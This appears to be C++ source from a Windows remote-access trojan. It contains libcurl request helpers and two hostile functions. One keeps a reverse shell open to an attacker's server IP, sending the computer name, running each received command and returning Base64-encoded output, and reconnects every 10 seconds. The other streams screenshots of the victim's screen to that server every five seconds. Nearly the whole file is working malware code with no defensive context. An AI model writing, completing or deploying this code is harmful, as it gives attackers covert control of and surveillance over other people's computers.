#include <string>
#include <thread>
#include "json.hpp"

#define CURL_STATICLIB

#ifdef _WIN64
#include "curl/x64/curl.h"
#pragma comment(lib, "curl/x64/libcurl_a.lib")
#else
#include "curl/x86/curl.h"
#pragma comment(lib, "curl/x86/libcurl_a.lib")
#endif

#pragma comment (lib, "Normaliz.lib")
#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Wldap32.lib")
#pragma comment (lib, "Crypt32.lib")
#pragma comment (lib, "advapi32.lib")
#pragma comment (lib, "user32.lib")


static size_t curl_writecallback(void* contents, size_t size, size_t nmemb, void* userp) {
    ((std::string*)userp)->append((char*)contents, size * nmemb);
    return size * nmemb;
}

std::string get_request(std::string url) {
    CURL* curl;
    CURLcode res;
    std::string readBuffer;

    curl = curl_easy_init();

    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, curl_writecallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);

        res = curl_easy_perform(curl);

        curl_easy_cleanup(curl);
    }

    return readBuffer;
}

CURLcode post_json(std::string url, std::string json) {
    CURL* curl;
    CURLcode res;

    curl_global_init(CURL_GLOBAL_ALL);
    curl = curl_easy_init();

    if (curl) {
        struct curl_slist* headers = NULL;

        headers = curl_slist_append(headers, "Content-Type: application/json");

        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json.c_str());
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());

        res = curl_easy_perform(curl);

        curl_easy_cleanup(curl);
        curl_slist_free_all(headers);
    }

    curl_global_cleanup();

    return res;
}

void do_tcp_rshell(std::string serverip, int port) {
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    SOCKET sock;

    nlohmann::json host;
    host["host"] = std::string(getenv("COMPUTERNAME"));

    while (true) {
        sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        struct sockaddr_in server;
        server.sin_family = AF_INET;
        server.sin_port = htons(port);
        server.sin_addr.s_addr = inet_addr(serverip.c_str());

        if (connect(sock, (struct sockaddr*)&server, sizeof(server)) != SOCKET_ERROR) {
            send(sock, host.dump().c_str(), strlen(host.dump().c_str()), 0);

            while (true) {
                char buffer[1024];

                if (recv(sock, buffer, 1024, 0) == 0) {
                    std::this_thread::sleep_for(std::chrono::seconds(10));
                    break;
                }

                std::string output;

                try {
                    output = Base64::Encode(exec_cmd(buffer));
                } catch (...) {
                    output = Base64::Encode("An error occured while executing your command, please try again.");
                }

                std::vector<BYTE> to_send = bytevector_rshell(output);

                send(sock, (const char*)to_send.data(), to_send.size(), 0);
            }
        } else {
            std::this_thread::sleep_for(std::chrono::seconds(10));
        }

        closesocket(sock);
    }

    WSACleanup();
}

void do_tcp_stream(std::string serverip, int port) {
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    SOCKET sock;

    nlohmann::json host;
    host["host"] = std::string(getenv("COMPUTERNAME"));

    while (true) {
        sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        struct sockaddr_in server;
        server.sin_family = AF_INET;
        server.sin_port = htons(port);
        server.sin_addr.s_addr = inet_addr(serverip.c_str());

        if (connect(sock, (struct sockaddr*)&server, sizeof(server)) != SOCKET_ERROR) {
            send(sock, host.dump().c_str(), strlen(host.dump().c_str()), 0);
            
            char status[1024];
            recv(sock, status, 1024, 0);

            if (strcmp(status, "OK") == 0) {
                while (true) {
                    auto data = screenshot_jpeg();
                    std::vector<BYTE> to_send = bytevector_spy(Base64::Encode(std::string(data.begin(), data.end())));
                    send(sock, (const char*)to_send.data(), to_send.size(), 0);
                    std::this_thread::sleep_for(std::chrono::seconds(5));
                }
            } else {
                break;
            }
        } else {
            std::this_thread::sleep_for(std::chrono::seconds(10));
        }

        closesocket(sock);
    }

    WSACleanup();
}
